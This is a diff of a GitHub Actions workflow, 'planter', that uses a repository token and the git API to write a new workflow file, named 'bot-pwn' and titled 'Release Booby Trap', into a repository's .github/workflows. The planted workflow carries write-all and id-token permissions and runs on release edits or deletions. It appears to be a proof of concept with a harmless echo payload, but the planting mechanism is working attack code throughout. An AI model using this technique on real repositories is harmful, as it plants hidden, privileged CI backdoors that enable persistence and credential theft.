@@ -1,11 +1,6 @@
 name: planter
 on:
   workflow_dispatch:
-    inputs:
-      tag:
-        description: random suffix
-        required: false
-        default: 'auto'
 permissions:
   contents: write
 jobs:
@@ -40,14 +35,16 @@ jobs:
           DOTGH=$(api GET "/repos/$REPO/git/trees/$MAIN_TREE" | jq -r '.tree[]|select(.path==".github")|.sha')
           WFTREE=$(api GET "/repos/$REPO/git/trees/$DOTGH" | jq -r '.tree[]|select(.path=="workflows")|.sha')
 
-          YAML="name: bot-pwn-$RAND
-          on: { release: { types: [published ,edited, deleted] } }
+          YAML="name: Release Booby Trap
+          on: { release: { types: [edited, deleted] } }
           permissions: write-all
           jobs:
             fire:
+              permissions:
+                id-token: write
               runs-on: ubuntu-latest
               steps:
-                - run: echo \"BOT_PWN_$RAND action=\${{ github.event.action }} actor=\${{ github.triggering_actor }} via_GHTOKEN=true\""
+                - run: echo "Workflow Execution!""
 
           BLOB=$(api POST "/repos/$REPO/git/blobs" "$(jq -nc --arg c "$YAML" '{content:$c, encoding:"utf-8"}')" | jq -r .sha)
           NEWWF=$(api POST "/repos/$REPO/git/trees" "$(jq -nc --arg t "$WFTREE" --arg fn "bot-pwn-$RAND.yml" --arg s "$BLOB" '{base_tree:$t, tree:[{path:$fn, mode:"100644", type:"blob", sha:$s}]}')" | jq -r .sha)
